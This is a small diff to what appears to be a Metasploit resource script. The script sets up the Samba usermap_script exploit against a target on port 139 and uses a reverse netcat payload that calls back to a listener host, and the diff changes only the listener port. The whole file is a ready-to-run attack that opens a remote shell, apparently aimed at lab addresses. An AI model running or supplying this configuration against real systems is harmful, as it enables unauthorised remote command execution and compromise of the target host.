@@ -2,7 +2,7 @@ use exploit/multi/samba/usermap_script
 set RHOST 198.18.5.155
 set RPORT 139
 set LHOST 198.18.14.2
-set LPORT 4444
+set LPORT 5555
 set PAYLOAD cmd/unix/reverse_netcat
 set DisablePayloadHandler false
 exploit -j
